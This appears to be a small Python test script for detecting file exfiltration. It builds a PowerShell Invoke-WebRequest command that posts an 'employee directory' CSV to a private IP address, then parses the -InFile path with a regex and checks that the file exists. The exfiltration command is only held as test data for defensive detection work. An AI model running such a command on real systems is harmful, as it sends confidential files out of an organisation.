import psutil
import re
import os

cmdline = ["powershell", "-Command", "Invoke-WebRequest -Uri http://192.168.100.143 -Method Post -InFile 'C:\\Users\\M S I\\Desktop\\usb-operation-demo\\synthetic_test_data\\01_internal_employee_directory.csv'"]

full_cmd = " ".join(cmdline)
print(f"full_cmd: {full_cmd}")

match = re.search(r'-infile\s+(?:([\'"])(.*?)\1|([^\s\'"]+))', full_cmd, re.IGNORECASE)
if match:
    file_path = match.group(2) or match.group(3)
    extracted_path = file_path
    if not os.path.isabs(extracted_path):
        extracted_path = os.path.join(os.getcwd(), extracted_path)
    print(f"extracted_path: {extracted_path}")
    print(f"exists: {os.path.exists(extracted_path)}")
else:
    print("NO MATCH")
